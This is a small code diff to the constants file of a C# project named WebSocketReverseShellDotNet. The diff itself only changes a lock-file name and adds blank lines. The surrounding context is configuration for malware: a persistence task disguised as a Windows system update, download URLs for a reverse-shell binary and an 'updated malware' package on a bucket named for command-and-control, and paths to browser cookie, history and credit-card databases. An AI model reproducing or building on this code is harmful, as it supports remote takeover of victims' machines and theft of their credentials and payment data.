@@ -26,7 +26,7 @@ namespace WebSocketReverseShellDotNet.utils
 
         public const String PERSISTENCE_WINDOWS_TASK = "UpdateWindowsSystemTask";
 
-        public const String LOCK_FILE_NAME = "93803181808-lock";
+        public const String LOCK_FILE_NAME = "9380378181806-lock";
 
         public const String JFROG_BASE_URL= "https://mhattab.jfrog.io/artifactory/libs-release-local/com/mtattab/reverseshell/reverseShell/";
         public const String UPDATED_MALWARE_URL= "https://c2-binaries.s3.us-east-2.amazonaws.com/reverseShell-1.0.1-zip.zip";
@@ -85,6 +85,11 @@ namespace WebSocketReverseShellDotNet.utils
         public static string COOKIES_BROWSER_DB = "Network\\Cookies";
         public static string HISTORY_BROWSER_DB = "History";
         public static string CREDIT_CARDS_BROWSER_DB = "Web Data";
+
+
+
+
+
 
     }
 }
